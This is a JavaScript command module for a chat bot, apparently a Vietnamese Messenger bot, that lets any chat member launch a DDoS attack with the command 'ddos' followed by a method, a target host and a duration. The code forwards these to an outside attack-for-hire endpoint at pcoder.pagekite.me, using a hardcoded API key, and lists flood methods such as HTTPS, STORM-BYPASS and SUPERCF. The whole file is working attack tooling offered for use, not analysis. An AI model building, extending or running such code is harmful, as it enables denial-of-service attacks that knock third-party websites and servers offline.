const axios = require("axios");
const fs = require("fs");

const apiKey = "NuxBasic_5612801409"; //thay tháº¿ api Ä‘Ã£ Ä‘Æ°á»£c Ä‘Æ°a

module.exports.config = {
    name: "ddos",
    version: "1.0.0",
    hasPermssion: 0,
    credits: "pcoder",
    description: "Ddos server",
    commandCategory: "Tiá»‡n Ã­ch",
    usages: "~ddos methods host time",
    cooldowns: 5,
    dependencies: { }
}

module.exports.run = async function({ api, event, args }) {
    const { threadID, messageID } = event;

    if (args.length === 0) {
        api.sendMessage({
            body: "ã€ğğ‚ğğƒğ„ğ‘xğğŠğ“ğğğ‹â€¢ğƒğƒğğ’ã€\nğ’ğ” ğƒğ”ğğ† : ~ddos ${methods} ${host} ${time}\nğ•ğƒ : ~ddos HTTPS https://freenom.com/ 60\nã€ğŒğ„ğ“ğ‡ğğƒğ’â€¢ğ‹ğŸ³ã€\nâ¢ğ’ğ”ğğ„ğ‘ğ‚ğ… ( host + time )\nâ¢ğ‡ğ“ğ“ğğ’ ( web + time )\nâ¢ğ’ğ“ğğ‘ğŒ-ğğ˜ğğ€ğ’ğ’ ( host + time )\nã€ğŒğ„ğ“ğ‡ğğƒğ’â€¢ğ‹ğŸ’ã€\nğ‚ğğŒğŒğˆğğ†â€¢ğ’ğğğ\nã€ğğ‚ğğƒğ„ğ‘ã€",
            attachment: fs.createReadStream(__dirname + "/ddos/Pcoder.gif")
        }, threadID, messageID);
        return;
    }

    if (args.length !== 3) {
        api.sendMessage("Báº¡n pháº£i nháº­p Ä‘á»§ thÃ´ng tin (methods, host, time)", threadID, messageID);
        return;
    }

    const methods = args[0];
    const host = args[1];
    const time = args[2];

    try {
        const url = `http://pcoder.pagekite.me/layer7?apikey=${apiKey}&method=${methods}&host=${host}&time=${time}`;
        const request = await axios.get(url);
        const response = request.data;

        if (response.status === "1") {
            api.sendMessage("Start Attack", threadID, messageID);
        } else {
            api.sendMessage("Attack Failed", threadID, messageID);
        }
    } catch (error) {
        console.error(error);
        api.sendMessage("Attack Failed", threadID, messageID);
    }
}
